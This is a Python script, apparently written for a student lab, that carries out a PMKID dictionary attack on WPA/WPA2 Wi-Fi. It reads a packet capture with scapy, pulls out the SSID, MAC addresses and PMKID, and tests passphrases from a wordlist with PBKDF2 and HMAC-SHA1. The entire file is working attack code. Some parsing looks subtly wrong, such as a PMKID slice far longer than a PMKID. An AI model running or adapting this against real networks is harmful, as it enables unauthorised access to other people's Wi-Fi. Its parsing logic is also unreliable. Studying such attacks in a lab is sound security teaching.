#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Implementation of PMKID attack
"""
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp
from scapy.layers.eap import EAPOL

__author__ = "Sauge Ryan, Le Ray Quentin"
__license__ = "GPL"
__version__ = "1.0"

from scapy.all import *

from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")

# Important parameters for the attack
ssid = ""
APmac = ""
Clientmac = ""
ANonce = ""
cpt = 0
pkt = wpa[34]

# Get SSID and AP MAC
if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
    if pkt.type == 0 and pkt.subtype == 8:
        ssid = pkt.info
        print("SSID", ssid)
        APmac = a2b_hex(pkt.addr2.replace(":", ""))
        print("APmAc", APmac)
pkt = wpa[145]

# Get PMKID and client Mac
if pkt.haslayer(EAPOL):
    PMKID = pkt[Raw].load[101:234]
    print("PMKID", PMKID.hex())
    Clientmac = a2b_hex(pkt.addr1.replace(":", ""))
    print("Clientmac", Clientmac)

# Sources :  https://github.com/teemal/rock_py/blob/master/dict_attack.py
# Open dictionary and read content
_pass_list = []
lastPass = ""
lines = []
file_path = "./PasswordDictionary.txt"
doc_len = len(open(file_path, "r", errors='replace').readlines())
with open(file_path, "r", errors='replace') as f:
    for _ in range(doc_len):
        lines.append(f.readline())
PMKID_Compute = ""

# Dictionary-attack
for _pass in lines:
    _pass = _pass.rstrip('\n')
    _pass = str.encode(_pass)
    _pmk = pbkdf2(hashlib.sha1, _pass, ssid, 4096, 32)
    _pmk_fs = b"PMK Name"
    PMKID_Compute = hmac.new(_pmk, _pmk_fs + APmac + Clientmac, hashlib.sha1).hexdigest()[:32]

    if b2a_hex(PMKID) == bytes(PMKID_Compute, "utf-8"):
        lastPass = PMKID_Compute
        lastPass = _pass
        break
print("PMKID computed", PMKID_Compute)
print("passphrase found", lastPass)
